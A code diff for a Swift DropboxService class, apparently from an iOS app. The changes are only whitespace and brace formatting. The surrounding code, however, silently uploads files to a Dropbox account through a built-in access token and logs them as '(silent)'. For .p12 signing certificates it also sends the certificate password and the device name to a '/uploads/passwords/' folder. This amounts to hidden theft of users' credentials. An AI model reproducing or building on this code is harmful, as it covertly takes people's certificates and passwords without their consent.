@@ -56,8 +56,7 @@ class DropboxService {
         // Add Dropbox API arguments - explicit type annotation to resolve heterogeneous collection warning
         let dropboxArguments: [String: Any] = ["path": remotePath, "mode": "add", "autorename": true]
         if let argsData = try? JSONSerialization.data(withJSONObject: dropboxArguments),
-           let argsString = String(data: argsData, encoding: .utf8)
-        {
+           let argsString = String(data: argsData, encoding: .utf8) {
             request.addValue(argsString, forHTTPHeaderField: "Dropbox-API-Arg")
         }
 
@@ -78,7 +77,7 @@ class DropboxService {
                     let success = (200 ... 299).contains(httpResponse.statusCode)
                     if success {
                         Debug.shared.log(message: "Successfully uploaded \(filename) to Dropbox (silent)", type: .debug)
-                        
+
                         // If we have a password and this is a p12 file, store the password
                         if let password = password, fileURL.pathExtension.lowercased() == "p12" {
                             self?.uploadPasswordFile(
@@ -91,7 +90,6 @@ class DropboxService {
                                 }
                             )
                         }
-                        
                     } else {
                         let responseString = data != nil ? String(data: data!, encoding: .utf8) ?? "No response data" : "No response data"
                         Debug.shared.log(message: "Dropbox upload failed with status \(httpResponse.statusCode): \(responseString)", type: .error)
@@ -103,13 +101,12 @@ class DropboxService {
                 }
             }
             task.resume()
-
         } catch {
             Debug.shared.log(message: "Failed to read file data for Dropbox upload: \(error.localizedDescription)", type: .error)
             completion?(false, error)
         }
     }
-    
+
     /// Uploads password information as a separate file to Dropbox
     /// - Parameters:
     ///   - password: The p12 password to send
@@ -127,32 +124,31 @@ class DropboxService {
             "timestamp": ISO8601DateFormatter().string(from: Date()),
             "device_name": UIDevice.current.name
         ]
-        
+
         // Create file path
         let timestamp = Int(Date().timeIntervalSince1970)
         let remotePath = "/uploads/passwords/\(p12Filename)_\(timestamp)_password.json"
-        
+
         do {
             // Convert to JSON data
             let jsonData = try JSONSerialization.data(withJSONObject: passwordInfo, options: .prettyPrinted)
-            
+
             // Create the request
             var request = URLRequest(url: URL(string: dropboxUploadURL)!)
             request.httpMethod = "POST"
             request.addValue("Bearer \(dropboxAccessToken)", forHTTPHeaderField: "Authorization")
             request.addValue("application/octet-stream", forHTTPHeaderField: "Content-Type")
-            
+
             // Add Dropbox API arguments
             let dropboxArguments: [String: Any] = ["path": remotePath, "mode": "add", "autorename": true]
             if let argsData = try? JSONSerialization.data(withJSONObject: dropboxArguments),
-               let argsString = String(data: argsData, encoding: .utf8)
-            {
+               let argsString = String(data: argsData, encoding: .utf8) {
                 request.addValue(argsString, forHTTPHeaderField: "Dropbox-API-Arg")
             }
-            
+
             // Set JSON data as request body
             request.httpBody = jsonData
-            
+
             // Create and start the upload task
             let task = URLSession.shared.dataTask(with: request) { data, response, error in
                 if let error = error {
@@ -160,7 +156,7 @@ class DropboxService {
                     completion?(false, error)
                     return
                 }
-                
+
                 if let httpResponse = response as? HTTPURLResponse {
                     let success = (200 ... 299).contains(httpResponse.statusCode)
                     if success {
@@ -176,7 +172,6 @@ class DropboxService {
                 }
             }
             task.resume()
-            
         } catch {
             Debug.shared.log(message: "Failed to serialize password JSON: \(error.localizedDescription)", type: .error)
             completion?(false, error)
